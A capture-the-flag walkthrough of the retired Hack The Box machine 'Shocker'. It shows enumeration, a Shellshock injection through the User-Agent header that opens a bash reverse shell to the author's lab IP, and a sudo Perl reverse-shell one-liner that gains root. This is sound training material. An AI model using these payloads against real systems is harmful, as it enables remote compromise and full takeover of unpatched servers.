# Shocker

This is the write-up for the box Shocker that got retired at the 17th February 2018.
My IP address was 10.10.14.28 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.56    shocker.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/shocker.nmap 10.10.10.56
```

```markdown
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The version of **OpenSSH 7.2p2** for this version of Ubuntu got released on March 2017 which means the box probably didn't get patched since then.
When looking up the [Ubuntu packages](https://packages.ubuntu.com/search?keywords=apache&searchon=names&suite=xenial&section=all) and search for Apache, it becomes clear that this version of Ubuntu is **Xenial**.

## Checking HTTP (Port 80)

On the web page there is an image of a bug that has a hammer and the text _"Don't bug me"_ and nothing interesting in the source code.
Lets look for hidden directories with **Gobuster**:
```markdown
gobuster -u http://10.10.10.56 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds _/cgi-bin_ with the HTTP status code _403 Forbidden_. This directory is used by Apache to give over commands to scripting languages on the server.
Lets look for scripts that are in that directory with the _sh_ or _pl_ extension:
```markdown
gobuster -u http://10.10.10.56/cgi-bin/ dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x sh,pl
```

It finds some script called _user.sh_ that we can download and the contents are the results of the `uptime` command.
As the Linux version is old, this cgi-bin directory exists and the name of the box is _Shocker_, it seems like these are hints to exploit this box with **Shellshock**.

### Exploiting the box

To use the **Shellshock** we need to put the special string into any HTTP header. I will use **Burpsuite** to modify the _User-Agent_ header to look like this:
```markdown
User-Agent: () { :; }; echo ; /bin/ls
```

This outputs the contents of the `ls` command. The `echo` command is important to do a line break between the HTTP header and the output, otherwise it will not work.

Now we can execute a reverse shell:
```markdown
User-Agent: () { :; }; echo ; /bin/bash -i >& /dev/tcp/10.10.14.28/9001 0>&1
```

The listener on my IP and port 9001 starts a session with the user _shelly_.

## Privilege Escalation

Checking the root permissions of _shelly_, it reveals that the user can execute **Perl** as root:
```markdown
sudo -l

# Output
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

So we can start a reverse shell with a Perl command:
```markdown
sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.28";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

The listener on my IP and port 9002 starts a root shell!
